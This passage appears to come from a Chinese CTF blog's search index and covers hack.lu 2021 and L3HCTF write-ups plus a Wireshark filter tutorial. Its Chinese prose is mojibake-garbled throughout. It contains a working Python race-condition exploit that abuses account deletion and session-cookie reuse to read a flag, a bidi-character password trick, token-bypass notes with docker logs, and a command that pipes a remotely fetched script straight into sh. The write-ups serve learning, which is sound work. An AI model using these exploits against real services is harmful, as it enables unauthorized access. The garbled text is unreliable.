·åˆ›å»ºè¿›ç¨‹æ¯”fork()è¿˜è¦ç®€å•ã€‚join()æ–¹æ³•å¯ä»¥ç­‰å¾…å­è¿›ç¨‹ç»“æŸåå†ç»§ç»­å¾€ä¸‹è¿è¡Œ(æ›´å‡†ç¡®åœ°è¯´ï¼Œåœ¨å½“å‰ä½ç½®é˜»å¡ä¸»è¿›ç¨‹ï¼Œå¸¦æ‰§è¡Œjoinï¼ˆï¼‰çš„è¿›ç¨‹ç»“æŸåå†ç»§ç»­æ‰§è¡Œä¸»è¿›ç¨‹#è¿™é‡Œè¯´ä¸€ä¸‹joinæ–¹æ³•ï¼Œæ¯”å¦‚è¯´æœ‰ä¸»è¿›ç¨‹å’Œaå’Œåœ¨æ‰§è¡Œï¼Œé‚£ä¹ˆå°±æ˜¯ä¸»è¿›ç¨‹æ‰§è¡Œç„¶åç´§è·Ÿç€a.start()ï¼Œé‡åˆ°a.join()å°±ä¼šå…ˆé˜»å¡ä¸»è¿›ç¨‹ï¼Œç­‰åˆ°aæ‰§è¡Œå®Œæ¯•ï¼Œå†æ‰§è¡Œä¸»è¿›ç¨‹ import requestsimport randomimport stringfrom multiprocessing import Processfrom time import sleepimport reurl = &quot;https://nodenb.flu.xxx&quot;def register(u,p): data={ &quot;username&quot;:u, &quot;password&quot;:p } r=s.post(url+'/register',data=data) return rdef login(u,p): data={ &quot;username&quot;:u, &quot;password&quot;:p } r=s.post(url+'/login',data=data) return rdef deleteme(): r=s.post(url+&quot;/deleteme&quot;) return rdef get_flag(): r=s.get(url+&quot;/notes/flag&quot;) print(r.text) return rdef sleep_notes(title,content,s): p=&quot;/notes?random=true&quot; r=s.post(url+p,data={'title':title,'content':content})if __name__==&quot;__main__&quot;: while True: s = requests.session() u = ''.join([random.choice(string.ascii_letters) for _ in range(3)]) p = ''.join([random.choice(string.ascii_letters) for _ in range(3)]) r1=register(u,p) l1=login(u,p) print(&quot;a&quot;,s.cookies) c=s.cookies.get(&quot;connect.sid&quot;) p=Process(target=sleep_notes,args=('a','a',s)) p.start() sleep(0.5) d=deleteme() p.join() s.cookies.update({&quot;connect.sid&quot;:c}) r=get_flag() if re.search(&quot;flag&quot;,r.text): print() break æœ€åè¿˜æ˜¯æ²¡å‡ºæ¥ã€‚å¤´æ™•äº†â€“ trading-api(High)jsæ–‡ä»¶æœ‰ç‚¹å¤šï¼Œä»é¡µé¢å…¥æ‰‹å§ï¼Œä¸€å¼€å§‹ä»–è¯´æˆ‘ä»¬æ²¡æœ‰tooken function authn(req, res, next) { const authHeader = req.header('authorization'); if (!authHeader) { return res.status(400).send('missing auth token'); } try { req.user = jsonwebtoken.verify(authHeader, JWT_SECRET); next(); } catch (error) { return res.status(401).send('invalid auth token'); }} æ‰€ä»¥æ¥çœ‹çœ‹loginçš„åœ°æ–¹ async function login(req, res) { const { username, password } = req.body; if (!username || !password) { return res.status(400).send('missing username or password'); } try { const r = await got.post(`${AUTH_SERVICE}/api/users/${encodeURI(username)}/auth`, { headers: { authorization: AUTH_API_TOKEN }, json: { password }, }); if (r.statusCode !== 200) { return res.status(401).send('wrong'); } const jwt = jsonwebtoken.sign({ username }, JWT_SECRET); return res.json({ token: jwt }); } catch (error) { return res.status(503).end('error'); }}","link":"/2021/10/31/2021hack-lu/"},{"title":"wiresharkå·¥å…·æ“ä½œ","text":"Wiresharkä½¿ç”¨æ•™ç¨‹ï¼ˆç•Œé¢è¯´æ˜ã€æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼ã€æ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾å¼ï¼‰ä¸€ã€è¯´æ˜1.1 èƒŒæ™¯è¯´æ˜å¯¹äºå¤§å¤šæ•°åˆšå¼€å§‹æ¥è§¦wiresharkçš„ä½¿ç”¨è€…è€Œè¨€ï¼Œç»å¸¸æ˜¯å¼€å§‹çš„æ—¶å€™æ—¶å€™çœ‹åˆ°wiresharkèƒ½æŠŠæ‰€æœ‰æ•°æ®åŒ…éƒ½æ‹¦æˆªä¸‹æ¥è§‰å¾—å¼ºæ— æ•Œï¼Œä½†æ˜¯é¢å¯¹ä¸€å¤§å †çš„æ•°æ®åŒ…è¦é—®æœ‰ä»€ä¹ˆç”¨æˆ–è€…è¯´æƒ³è¦æ‰¾åˆ°æˆ‘æƒ³è¦çš„é‚£äº›æ•°æ®åŒ…æ€ä¹ˆæ‰¾ï¼ˆæ¯”å¦‚telnetç™»å½•è¿‡ç¨‹çš„é‚£äº›æ•°æ®åŒ…ï¼‰åˆ™å®Œå…¨æ˜¯ä¸€è„¸èŒ«ç„¶ã€‚ ä¸€æ˜¯ç•Œé¢ä¸€å †çª—å£ï¼Œä»€ä¹ˆä½œç”¨ä»€ä¹ˆåŒºåˆ«çœ‹ä¸æ‡‚ï¼›äºŒæ˜¯æ•è·ã€æ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾ç¤ºçœ‹ä¸å‡ºæœ‰ä»€ä¹ˆè§„å¾‹ï¼Œæ¯æ¬¡è¿‡æ»¤éƒ½è¦ç™¾åº¦æ‰¾åŠå¤©ã€‚å…¶å®wiresharkç•Œé¢è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œè¿‡æ»¤å™¨è¡¨è¿‡ç¤ºä¹Ÿä¸å›°éš¾ï¼Œæˆ‘ä»¬ä»Šå¤©å°±æ¥ç ´è§£è¿™wiresharkä½¿ç”¨çš„ä¸¤å¤§éš¾é¢˜ã€‚ å®˜ç½‘åœ°å€ï¼šhttps://www.wireshark.org/ å®˜ç½‘ä¸‹è½½åœ°å€ï¼šhttps://www.wireshark.org/#download å®‰è£…å°±ä¸å¤šè¯´äº†å’Œä¸€èˆ¬windowsä¸€æ ·ä¸‹ä¸€æ­¥ä¸‹ä¸€ä¸‹è£…å°±å¯ä»¥äº†ã€‚å¦å¤–etherealä¸ºä»€ä¹ˆåœ¨2006å¹´æ›´åwiresharkå‚è§ï¼šhttps://www.linux.com/news/ethereal-changes-name-wireshark 1.2 æ‹¦æˆªæœ¬åœ°å›ç¯æ•°æ®å¦å¤–æ³¨æ„æœ¬æœºè®¿é—®æœ¬æœºçš„å›ç¯æ•°æ®æ˜¯ä¸ç»è¿‡ç½‘å¡çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨æœ¬æœºè®¿é—®æ­å»ºåœ¨æœ¬æœºä¸Šçš„webæœåŠ¡ï¼Œä½†æˆ‘ä»¬ç»å¸¸æœ‰æœåŠ¡æ­å»ºåœ¨æœ¬æœºçš„æ“ä½œä¹Ÿç»å¸¸æœ‰æ‹¦æˆªæœ¬åœ°å›ç¯æ•°æ®åŒ…åŠ ä»¥åˆ†æçš„éœ€æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬ç¯è¦æ‹¦è½½å›ç¯æ•°æ®åŒ…ã€‚æ“ä½œå¦‚ä¸‹ã€‚ é¦–å…ˆï¼Œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œcmdï¼ˆæ™®é€šç”¨æˆ·æ²¡æœ‰è·¯ç”±è¡¨æ“ä½œæƒé™ï¼Œä¼šæç¤ºâ€œè¯·æ±‚çš„æ“ä½œéœ€è¦æå‡â€ï¼‰ ç„¶åï¼Œä½¿ç”¨ipconfigæŸ¥çœ‹æœ¬æœºipå’Œç½‘å…³ï¼š ipconfig å†ç„¶åï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ·»åŠ è·¯ç”±ï¼ŒæŒ‡å®šå›ç¯æ•°æ®ä¹Ÿè¦å…ˆè½¬å‘åˆ°ç½‘å…³ï¼ˆä½¿ç”¨ä¸Šä¸€æ­¥è·å–æœ¬çš„æœ¬æœºipå’Œç½‘å…³æ›¿æ¢å…¶ä¸­çš„å’Œï¼‰ï¼š route add &lt;your_IP&gt; mask 255.255.255.255 &lt;gateway_IP&gt; metric 1 æœ€åï¼ŒæŸ¥çœ‹è·¯ç”±è¡¨ä¸­è·¯ç”±æ˜¯å¦å·²æ·»åŠ æˆåŠŸï¼š route print å›ç¯æ•°æ®ç»ç½‘å…³å†å›æ¥ä¼šå¢åŠ ç½‘å¡çš„å‹åŠ›ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ é™¤è·¯ç”±ï¼ˆä½¿ç”¨å‰è¾¹è·å–æœ¬çš„æœ¬æœºipæ›¿æ¢å…¶ä¸­çš„ï¼‰ï¼š route delete &lt;your_IP&gt; äºŒã€Wiresharkç•Œé¢è¯´æ˜è¿‡æ»¤å™¨è¡¨è¾¾å¼ä¹¦å†™æ˜¯wiresharkä½¿ç”¨çš„æ ¸å¿ƒï¼Œä½†åœ¨æ­¤ä¹‹å‰ï¼Œå¾ˆå¤šåˆå­¦è€…è¿˜ä¼šç¢°åˆ°ä¸€ä¸ªéš¾é¢˜ï¼Œå°±æ˜¯æ„Ÿè§‰wiresharkç•Œé¢ä¸Šå¾ˆå¤šä¸œè¥¿ä¸æ‡‚æ€ä¹ˆçœ‹ã€‚å…¶å®è¿˜æ˜¯æŒºæ˜äº†çš„æˆ‘ä»¬ä¸‹é¢ç®€å•è¯´ä¸€ä¸‹ï¼Œå¦‚ä¸‹å›¾ã€‚ 1å·çª—å£å±•ç¤ºçš„æ˜¯wiresharkæ•è·åˆ°çš„æ‰€æœ‰æ•°æ®åŒ…çš„åˆ—è¡¨ã€‚æ³¨æ„æœ€åä¸€åˆ—Infoåˆ—æ˜¯wiresharkç»„ç»‡çš„è¯´æ˜åˆ—å¹¶ä¸ä¸€å®šæ˜¯è¯¥æ•°æ®åŒ…ä¸­çš„åŸå§‹å†…å®¹ã€‚ 2å·çª—å£æ˜¯1å·çª—å£ä¸­é€‰å®šçš„æ•°æ®åŒ…çš„åˆ†åè®®å±‚å±•ç¤ºã€‚åº•è‰²ä¸ºçº¢è‰²çš„æ˜¯å› ä¸ºwiresharkå¼€å¯æ ¡éªŒå’ŒéªŒè¯è€Œè¯¥å±‚åè®®æ ¡éªŒå’Œåˆä¸æ­£ç¡®æ‰€è‡´ã€‚ 3å·çª—å£æ˜¯1å·çª—å£ä¸­é€‰å®šçš„æ•°æ®åŒ…çš„æºæ•°æ®ï¼Œå…¶ä¸­å·¦ä¾§æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºå³ä¾§æ˜¯ASCIIç è¡¨ç¤ºã€‚å¦å¤–åœ¨2å·çª—å£ä¸­é€‰ä¸­æŸå±‚æˆ–æŸå­—æ®µï¼Œ3å·çª—å£å¯¹åº”ä½ç½®ä¹Ÿä¼šè¢«é«˜äº®ã€‚ è¢«è®¤ä¸ºæœ€éš¾çš„å…¶å®è¿˜æ˜¯2å·çª—å£å±•å¼€åçš„å†…å®¹ä¸æ‡‚æ€ä¹ˆçœ‹ï¼Œå…¶å®ä¹Ÿå¾ˆæ˜äº†ï¼Œä»¥IPå±‚ä¸ºä¾‹ï¼š æ¯ä¸€è¡Œå°±å¯¹åº”è¯¥å±‚åè®®çš„ä¸€ä¸ªå­—æ®µï¼›ä¸­æ‹¬å·è¡Œæ˜¯å‰ä¸€å­—æ®µçš„è¯´æ˜ã€‚ å†’å·å‰çš„è‹±æ–‡æ˜¯åè®®å­—æ®µçš„åç§°ï¼›å†’å·åæ˜¯è¯¥æ•°æ®åŒ…ä¸­è¯¥åè®®å­—æ®µçš„å€¼ã€‚ ä¸‰ã€æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼ä½œç”¨åœ¨wiresharkå¼€å§‹æ•è·æ•°æ®åŒ…ä¹‹å‰ï¼Œåªæ•è·ç¬¦åˆæ¡ä»¶çš„æ•°æ®åŒ…ï¼Œä¸è®°å½•ä¸ç¬¦åˆæ¡ä»¶çš„æ•°æ®åŒ…ã€‚ æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ²¡æœ‰åƒæ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾å¼é‚£æ ·æ˜æ˜¾çš„è§„å¾‹ï¼Œä½†å†™æ³•ä¸å¤šæ‰€ä»¥ä¹Ÿä¸éš¾ï¼›è€Œä¸”é™¤éå…¨éƒ¨æ•è·è¦å ç”¨çš„ç£ç›˜ç©ºé—´å®ç°å¤ªå¤§ï¼Œä¸”ä½ éå¸¸æ˜ç¡®è¿‡æ»¤æ‰çš„æ•°æ®åŒ…æ˜¯ä½ ä¸éœ€è¦çš„ï¼Œä¸ç„¶ä¸€èˆ¬éƒ½ä¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼è€Œç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾å¼ã€‚ åœ¨wireshark2.xç‰ˆæœ¬ï¼Œå¯åŠ¨åæ¬¢è¿ç•Œé¢å³æœ‰æ•è·è¿‡æ»¤å™¨ï¼Œåœ¨å…¶ä¸­è¾“å…¥è¿‡æ»¤è¡¨è¾¾å¼å¼€å§‹æ•è·æ•°æ®åŒ…æ—¶å³ä¼šç”Ÿæ•ˆï¼š ç‚¹å‡»å›¾ä¸­â€œä¹¦ç­¾â€æ ‡å¿—ï¼Œå†ç‚¹ç®¡ç†â€œæ•è·ç­›é€‰å™¨â€ï¼Œå³å¯çœ‹åˆ°å¸¸ç”¨æ•è·è¿‡æ»¤è¡¨è¾¾ç¤ºçš„ä¹¦å†™å½¢å¼ å››ã€æ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾ç¤ºåŠå…¶ä¹¦å†™è§„å¾‹æ˜¾ç¤ºè¿‡æ»¤å™¨è¡¨è¾¾å¼ä½œç”¨åœ¨åœ¨wiresharkæ•è·æ•°æ®åŒ…ä¹‹åï¼Œä»å·²æ•è·çš„æ‰€æœ‰æ•°æ®åŒ…ä¸­æ˜¾ç¤ºå‡ºç¬¦åˆæ¡ä»¶çš„æ•°æ®åŒ…ï¼Œéšè—ä¸ç¬¦åˆæ¡ä»¶çš„æ•°æ®åŒ…ã€‚ æ˜¾ç¤ºè¿‡æ»¤è¡¨è¾¾ç¤ºåœ¨å·¥å…·æ ä¸‹æ–¹çš„â€œæ˜¾ç¤ºè¿‡æ»¤å™¨â€è¾“å…¥æ¡†è¾“å…¥å³å¯ç”Ÿæ•ˆ 4.1 åŸºæœ¬è¿‡æ»¤è¡¨è¾¾å¼ä¸€æ¡åŸºæœ¬çš„è¡¨è¾¾å¼ç”±è¿‡æ»¤é¡¹ã€è¿‡æ»¤å…³ç³»ã€è¿‡æ»¤å€¼ä¸‰é¡¹ç»„æˆã€‚ æ¯”å¦‚ip.addr == 192.168.1.1ï¼Œè¿™æ¡è¡¨è¾¾å¼ä¸­ip.addræ˜¯è¿‡æ»¤é¡¹ã€==æ˜¯è¿‡æ»¤å…³ç³»ï¼Œ192.168.1.1æ˜¯è¿‡æ»¤å€¼ï¼ˆæ•´æ¡è¡¨è¾¾ç¤ºçš„æ„æ€æ˜¯æ‰¾å‡ºæ‰€æœ‰ipåè®®ä¸­æºæˆ–ç›®æ ‡ipã€ç­‰äºã€192.168.1.1çš„æ•°æ®åŒ…ï¼‰ 4.1.1 è¿‡æ»¤é¡¹åˆå­¦è€…æ„Ÿè§‰çš„â€œè¿‡æ»¤è¡¨è¾¾å¼å¤æ‚â€ï¼Œæœ€ä¸»è¦å°±æ˜¯åœ¨è¿™ä¸ªè¿‡æ»¤é¡¹ä¸Šï¼šä¸€æ˜¯ä¸çŸ¥é“æœ‰å“ªäº›è¿‡æ»¤é¡¹ï¼ŒäºŒæ˜¯ä¸çŸ¥é“è¿‡æ»¤é¡¹è¯¥æ€ä¹ˆå†™ã€‚ è¿™ä¸¤ä¸ªé—®é¢˜æœ‰ä¸€ä¸ªå…±åŒçš„ç­”æ¡ˆâ€”â€“wiresharkçš„è¿‡æ»¤é¡¹æ˜¯â€œåè®®â€œ+â€.â€œ+â€åè®®å­—æ®µâ€çš„æ¨¡å¼ã€‚ä»¥ç«¯å£ä¸ºä¾‹ï¼Œç«¯å£å‡ºç°äºtcpåè®®ä¸­æ‰€ä»¥æœ‰ç«¯å£è¿™ä¸ªè¿‡æ»¤é¡¹ä¸”å…¶å†™æ³•å°±æ˜¯tcp.portã€‚ æ¨å¹¿åˆ°å…¶ä»–åè®®ï¼Œå¦‚ethã€ipã€udpã€httpã€telnetã€ftpã€icmpã€snmpç­‰ç­‰å…¶ä»–åè®®éƒ½æ˜¯è¿™ä¹ˆä¸ªä¹¦å†™æ€è·¯ã€‚å½“ç„¶wiresharkå‡ºäºç¼©å‡é•¿åº¦çš„åŸå› æœ‰äº›å­—æ®µæ²¡æœ‰ä½¿ç”¨åè®®è§„å®šçš„åç§°è€Œæ˜¯ä½¿ç”¨ç®€å†™ï¼ˆæ¯”å¦‚Destination Portåœ¨wiresharkä¸­å†™ä¸ºdstportï¼‰åˆå‡ºäºç®€ä½¿ç”¨å¢åŠ äº†ä¸€äº›åè®®ä¸­æ²¡æœ‰çš„å­—æ®µï¼ˆæ¯”å¦‚tcpåè®®åªæœ‰æºç«¯å£å’Œç›®æ ‡ç«¯å£å­—æ®µï¼Œä¸ºäº†ç®€ä¾¿ä½¿ç”¨wiresharkå¢åŠ äº†tcp.portå­—æ®µæ¥åŒæ—¶ä»£è¡¨è¿™ä¸¤ä¸ªï¼‰ï¼Œä½†æ€è·¯æ€»çš„ç®—æ˜¯ä¸å˜çš„ã€‚è€Œä¸”åœ¨å®é™…ä½¿ç”¨æ—¶æˆ‘ä»¬è¾“å…¥â€œåè®®â€+â€œ.â€wiresharkå°±ä¼šæœ‰æ”¯æŒçš„å­—æ®µæç¤ºï¼ˆç‰¹åˆ«æ˜¯è¿‡æ»¤è¡¨è¾¾å¼å­—æ®µçš„é¦–å­—æ¯å’Œwiresharkåœ¨ä¸Šè¾¹2çª—å£æ˜¾ç¤ºçš„å­—æ®µåç§°é¦–å­—æ¯é€šå¸¸æ˜¯ä¸€æ ·çš„ï¼‰ï¼Œçœ‹ä¸‹åç§°å°±å¤§æ¦‚çŸ¥é“è¦ç”¨å“ªä¸ªå­—æ®µäº†ã€‚wiresharkæ”¯æŒçš„å…¨éƒ¨åè®®åŠåè®®å­—æ®µå¯æŸ¥çœ‹å®˜æ–¹è¯´æ˜ã€‚ 4.1.2 è¿‡æ»¤å…³ç³»è¿‡æ»¤å…³ç³»å°±æ˜¯å¤§äºã€å°äºã€ç­‰äºç­‰å‡ ç§ç­‰å¼å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥çœ‹å®˜æ–¹ç»™å‡ºçš„è¡¨ã€‚æ³¨æ„å…¶ä¸­æœ‰â€œEnglishâ€å’Œâ€œC-likeâ€ä¸¤ä¸ªå­—æ®µï¼Œè¿™ä¸ªæ„æ€æ˜¯è¯´â€œEnglishâ€å’Œâ€œC-likeâ€è¿™ä¸¤ç§å†™æ³•åœ¨wiresharkä¸­æ˜¯ç­‰ä»·çš„ã€éƒ½æ˜¯å¯ç”¨çš„ã€‚ 4.1.3 è¿‡æ»¤å€¼è¿‡æ»¤å€¼å°±æ˜¯è®¾å®šçš„è¿‡æ»¤é¡¹åº”è¯¥æ»¡è¶³è¿‡æ»¤å…³ç³»çš„æ ‡å‡†ï¼Œæ¯”å¦‚500ã€5000ã€50000ç­‰ç­‰ã€‚è¿‡æ»¤å€¼çš„å†™æ³•ä¸€èˆ¬å·²ç»è¢«è¿‡æ»¤é¡¹å’Œè¿‡æ»¤å…³ç³»è®¾å®šå¥½äº†ï¼Œåªæ˜¯å¡«ä¸‹è‡ªå·±çš„æœŸæœ›å€¼å°±å¯ä»¥äº†ã€‚ 4.2 å¤åˆè¿‡æ»¤è¡¨è¾¾ç¤ºæ‰€è°“å¤åˆè¿‡æ»¤è¡¨è¾¾ç¤ºï¼Œå°±æ˜¯æŒ‡ç”±å¤šæ¡åŸºæœ¬è¿‡æ»¤è¡¨è¾¾å¼ç»„åˆè€Œæˆçš„è¡¨è¾¾ç¤ºã€‚åŸºæœ¬è¿‡æ»¤è¡¨è¾¾å¼çš„å†™æ³•è¿˜æ˜¯ä¸å˜çš„ï¼Œå¤åˆè¿‡æ»¤è¡¨è¾¾ç¤ºå¤šå‡ºæ¥çš„ä¸œè¥¿å°±åªæ˜¯åŸºæœ¬è¿‡æ»¤è¡¨è¾¾ç¤ºçš„â€œè¿æ¥è¯â€ æˆ‘ä»¬ä¾ç„¶ç›´æ¥å‚ç…§å®˜æ–¹ç»™å‡ºçš„è¡¨ï¼ŒåŒæ ·â€œEnglishâ€å’Œâ€œC-likeâ€è¿™ä¸¤ä¸ªå­—æ®µè¿˜æ˜¯è¯´æ˜è¿™ä¸¤ç§å†™æ³•åœ¨wiresharkä¸­æ˜¯ç­‰ä»·çš„ã€éƒ½æ˜¯å¯ç”¨çš„ã€‚ 4.3 å¸¸è§ç”¨æ˜¾ç¤ºè¿‡æ»¤éœ€æ±‚åŠå…¶å¯¹åº”è¡¨è¾¾å¼æ•°æ®é“¾è·¯å±‚ï¼š ç­›é€‰macåœ°å€ä¸º04:f9:38:ad:13:26çš„æ•°æ®åŒ…â€”-eth.src == 04:f9:38:ad:13:26 ç­›é€‰æºmacåœ°å€ä¸º04:f9:38:ad:13:26çš„æ•°æ®åŒ…â€”-eth.src == 04:f9:38:ad:13:26 ç½‘ç»œå±‚ï¼š ç­›é€‰ipåœ°å€ä¸º192.168.1.1çš„æ•°æ®åŒ…â€”-ip.addr == 192.168.1.1 ç­›é€‰192.168.1.0ç½‘æ®µçš„æ•°æ®â€”- ip contains â€œ192.168.1â€ ç­›é€‰192.168.1.1å’Œ192.168.1.2ä¹‹é—´çš„æ•°æ®åŒ…â€”-ip.addr == 192.168.1.1 &amp;&amp; ip.addr == 192.168.1.2 ç­›é€‰ä»192.168.1.1åˆ°192.168.1.2çš„æ•°æ®åŒ…â€”-ip.src == 192.168.1.1 &amp;&amp; ip.dst == 192.168.1.2 ä¼ è¾“å±‚ï¼š ç­›é€‰tcpåè®®çš„æ•°æ®åŒ…â€”-tcp ç­›é€‰é™¤tcpåè®®ä»¥å¤–çš„æ•°æ®åŒ…â€”-!tcp ç­›é€‰ç«¯å£ä¸º80çš„æ•°æ®åŒ…â€”-tcp.port == 80 ç­›é€‰12345ç«¯å£å’Œ80ç«¯å£ä¹‹é—´çš„æ•°æ®åŒ…â€”-tcp.port == 12345 &amp;&amp; tcp.port == 80 ç­›é€‰ä»12345ç«¯å£åˆ°80ç«¯å£çš„æ•°æ®åŒ…â€”-tcp.srcport == 12345 &amp;&amp; tcp.dstport == 80 åº”ç”¨å±‚ï¼š ç‰¹åˆ«è¯´æ˜â€”-httpä¸­http.requestè¡¨ç¤ºè¯·æ±‚å¤´ä¸­çš„ç¬¬ä¸€è¡Œï¼ˆå¦‚GET index.jsp HTTP/1.1ï¼‰ï¼Œhttp.responseè¡¨ç¤ºå“åº”å¤´ä¸­çš„ç¬¬ä¸€è¡Œï¼ˆå¦‚HTTP/1.1 200 OKï¼‰ï¼Œå…¶ä»–å¤´éƒ¨éƒ½ç”¨http.header_nameå½¢å¼ã€‚ ç­›é€‰urlä¸­åŒ…å«.phpçš„httpæ•°æ®åŒ…â€”-http.request.uri contains â€œ.phpâ€ ç­›é€‰å†…å®¹åŒ…å«usernameçš„httpæ•°æ®åŒ…â€”-http contains â€œusernameâ€","link":"/2021/10/20/wireshark%E5%B7%A5%E5%85%B7%E6%93%8D%E4%BD%9C/"},{"title":"2021l3ctf","text":"easyphpé€åˆ†é¢˜å‘ç°passwordæ²¡é‚£ä¹ˆçŸ­ï¼ŒåŒå‡»å¤åˆ¶ä¸€ä¸‹ï¼Œç„¶åurlencode &lt;?phpecho urlencode(&quot;â€®â¦L3Hâ©â¦password&quot;);echo &quot;\\n&quot;;echo urlencode(&quot;â€®â¦CTFâ©â¦l3hctf&quot;);?&gt; æ¥ä¸‹æ¥å‘é€å³å¯ image-service1shareå›¾ç‰‡ï¼Œæ³¨å†Œäº†ä¸€ä¸‹ï¼Œå‘ç°aå¯ä»¥shareåˆ°bçš„ï¼Œç„¶åadminä¸è®©æ³¨å†Œï¼Œä¹Ÿä¸è®©shareï¼Œä½†æ˜¯è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ADMINä¹ŸåŒæ ·å¯ä»¥shareåˆ°ã€‚ã€‚ã€‚ image-service2çœ‹äº†åŠå¤©ï¼Œè¦æƒ³è¯»åˆ°flag2å°±éœ€è¦æ›´æ”¹blurå‚æ•°è¿˜æœ‰xï¼Œä½†æ˜¯ç›´æ¥æ”¹çš„è¯ï¼Œä¼šè¯´tokenä¸å­˜åœ¨ï¼Œæ‰€ä»¥è§‰å¾—è¿˜æ˜¯åº”è¯¥çœ‹çœ‹å‚æ•°å’Œuuidçš„å…³ç³»æ˜¯å•¥æ ·çš„ï¼Œæ­£å¥½é™„ä»¶é‡Œé¢æœ‰dockeræ–‡ä»¶ï¼Œèµ·ä¸€ä¸ªdockerçœ‹çœ‹ï¼Œæ­£å¥½å­¦ä¹ ä¸€ä¸‹å¦‚ä½•å¼„è¿™ä¸ªç©æ„ï¼š å‚è€ƒé“¾æ¥ï¼šhttps://cloud.tencent.com/developer/article/1169085 up å®‰è£…ç»„ä¸‹çš„å®¹å™¨é›†åˆé»˜è®¤çš„ymlçš„æ–‡ä»¶åç§°æ˜¯å½“å‰ç›®å½•ä¸‹çš„docker-compose.ymlï¼Œå¦‚æœéœ€è¦æŒ‡å®šï¼šdocker-compose -f æ–‡ä»¶å updocker-compose up -d åå°è¿è¡Œä¸æ˜¾ç¤ºæ—¥å¿—pwdcurl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://b81aace9.m.daocloud.iosudo docker-compose -f docker-compose.yml up éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨é…ç½®envçš„æ—¶å€™ï¼Œéœ€è¦æ›´æ”¹ä¸€äº›å‚æ•°ï¼Œè¸©å‘ä¸»è¦ä¹Ÿæ˜¯åœ¨locéœ€è¦é…ç½®ä¸ºä½ çš„æœåŠ¡å™¨ipåœ°å€ï¼Œä½†æ˜¯åœ¨è¿™é‡Œä¸çŸ¥é“ä¸ºå•¥è¿™æ ·ä¹Ÿèµ·ä¸äº†ï¼Œä½†æ˜¯1002çš„ç«¯å£å¯ä»¥å¼€å¯ï¼Œæ‰€ä»¥å°±ç›´æ¥ç”¨äº†ï¼Œè¿™é‡Œç¡®å®æ²¡æƒ³åˆ°ï¼Œå…¶å®ç›´æ¥æŸ¥çœ‹dockerçš„æ—¥å¿—ï¼Œçœ‹çœ‹geté‚£è¾¹çš„å€¼æ˜¯å¦‚ä½•ä¼ å…¥çš„å°±è¡Œäº†ï¼Œå¦‚ä½•æ‰èƒ½åšåˆ°tookenä¸€è‡´ å¯¹æ¯”ä¸€ä¸‹ é¦–å…ˆæˆ‘å‘äº†ä¸¤æ¬¡blur=20çš„ å‘ç°ä»–ä»¬çš„tookenéƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå½“æˆ‘æ›´æ”¹å€¼ä»¥åï¼Œä»–ä»¬çš„tookenå°±å‘ç”Ÿæ”¹å˜äº†ï¼Œå¯ä»¥çœ‹åˆ°æ ‡é»„çš„é‚£æ®µï¼Œé‚£ä¹ˆè¦å¦‚ä½•ç»•è¿‡å‘¢ï¼Œå¯ä»¥çœ‹åˆ°ä»–ç»è¿‡äº†ä¸€ä¸ªmapå¤„ç†ï¼ŒçŒœæƒ³è¿™é‡Œçš„mapæ˜¯å¯¹é‡Œé¢çš„å€¼è¿›è¡Œè®¡ç®—ç„¶åå¾—åˆ°ä¸€ä¸ªtookenï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¯ä»¥åšåˆ°è¾“å…¥blur:[20]åœ¨å®é™…ä¸­å…¶å®åˆæ²¡æœ‰è¿™ä¸ªå€¼ï¼Œé‚£å°±å¯ä»¥ç»•è¿‡äº† image-service-nginx-1 | 211.97.128.174 - - [16/Nov/2021:09:59:50 +0000] &quot;GET /get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200 HTTP/1.1&quot; 403 25 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot; &quot;-&quot;image-service-service-1 | map[blur:[20] text:[secret] textsize:[50] uuid:[4bb2c93b-b18f-42fc-97fc-ec5a3afbab64] x1:[200] y1:[200]]image-service-service-1 | //c45fe4fc97e10d46273f8ab3a04233a313e2403e6fdf33bd1b4ab5fd24cc6bf1 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907image-service-service-1 | [GIN] 2021/11/16 - 09:59:50 | 403 | 62.594Âµs | 172.18.0.2 | GET &quot;/get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200&quot;image-service-nginx-1 | 211.97.128.174 - - [16/Nov/2021:10:05:42 +0000] &quot;GET /get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200 HTTP/1.1&quot; 403 25 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 